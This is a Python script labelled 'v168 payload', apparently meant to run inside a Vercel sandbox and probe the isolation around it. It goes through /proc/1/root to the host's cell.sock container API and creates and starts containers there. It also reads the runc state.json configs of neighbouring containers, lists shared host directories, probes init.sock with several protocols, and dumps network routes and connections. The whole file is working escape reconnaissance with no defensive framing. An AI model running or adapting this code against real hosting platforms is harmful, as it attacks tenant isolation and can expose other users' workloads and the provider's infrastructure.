# -*- coding: utf-8 -*-
"""v168 payload: 容器 state.json 完整 config + init.sock 探测 + /run/vercel/share 枚举
输出 /vercel/sandbox/v168c.out"""
import socket, struct, time, json, os, signal, re, ctypes, subprocess

OUT = '/vercel/sandbox/v168c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=450):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def probe_unix(sockpath, payload=b'', t=3):
    """连接 unix socket 发数据读响应"""
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if payload:
            s.sendall(payload)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 4000:
                    break
        except Exception:
            pass
        s.close()
        return d[:3000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__


# ============ 1: Create yes + Start ============
log('=== 1 setup ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'yes'}).encode(), t=8)
log('Create yes -> %s %r' % (st, pay[:200]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
log('cid=%s' % cid)
if cid:
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2[:200]))
    time.sleep(1)

    # ============ 2: 我们的容器 state.json ============
    log('=== 2 our state ===')
    for base in ['/run/runc', R + '/run/runc']:
        try:
            sp = os.path.join(base, cid, 'state.json')
            d = open(sp).read()
            log('OUR STATE %s len=%d' % (sp, len(d)))
            # 分段输出完整 config
            for i in range(0, len(d), 380):
                log('ST %s' % d[i:i + 380])
        except Exception as e:
            log('STATE %s EXC %s' % (base, e))

    # ============ 3: sandbox-init state.json (对照) ============
    log('=== 3 sbi state ===')
    try:
        for e in sorted(os.listdir('/run/runc')):
            if e != cid:
                sp = '/run/runc/%s/state.json' % e
                d = open(sp).read()
                log('SBI STATE %s len=%d head=%r' % (e, len(d), d[:600]))
    except Exception as e:
        log('SBI EXC %s' % e)

# ============ 4: /run/vercel/share 枚举 ============
log('=== 4 share ===')
for base in ['/run/vercel/share', R + '/run/vercel/share', R + '/volumes/run/vercel/share']:
    try:
        for e in sorted(os.listdir(base)):
            p = os.path.join(base, e)
            stt = os.lstat(p)
            typ = 'dir' if (stt.st_mode & 0o170000) == 0o040000 else ('sock' if (stt.st_mode & 0o170000) == 0o140000 else 'file')
            log('SHARE %s/%s type=%s mode=%o' % (base, e, typ, stt.st_mode & 0o777))
    except Exception as e:
        log('SHARE %s EXC %s' % (base, e))

# ============ 5: init.sock 探测 ============
log('=== 5 init.sock ===')
for sp in ['/run/vercel/share/init.sock', R + '/run/vercel/share/init.sock']:
    # 试 HTTP
    r = probe_unix(sp, b'GET / HTTP/1.1\r\nHost: unix\r\nConnection: close\r\n\r\n', t=3)
    log('HTTP %s -> %r' % (sp, r[:500]))
    # 试 JSON
    r = probe_unix(sp, b'{"jsonrpc":"2.0","method":"ping","id":1}\n', t=2)
    log('JSON %s -> %r' % (sp, r[:300]))
    # 试裸连接
    r = probe_unix(sp, b'', t=2)
    log('RAW %s -> %r' % (sp, r[:300]))

# ============ 6: 网络补充 ============
log('=== 6 net2 ===')
log('ROUTE: %s' % subprocess.run(['cat', '/proc/net/route'], capture_output=True, timeout=5).stdout.decode(errors='replace')[:800])
log('IFACE: %s' % subprocess.run(['ls', '/sys/class/net'], capture_output=True, timeout=5).stdout.decode(errors='replace')[:300])
try:
    for ln in open('/proc/net/tcp').read().splitlines()[1:]:
        p = ln.split()
        if len(p) > 3 and p[3] != '0A':
            log('TCP %s %s %s' % (p[1], p[2], p[3]))
except Exception as e:
    log('TCP EXC %s' % e)

log('V168_DONE')
f.close()
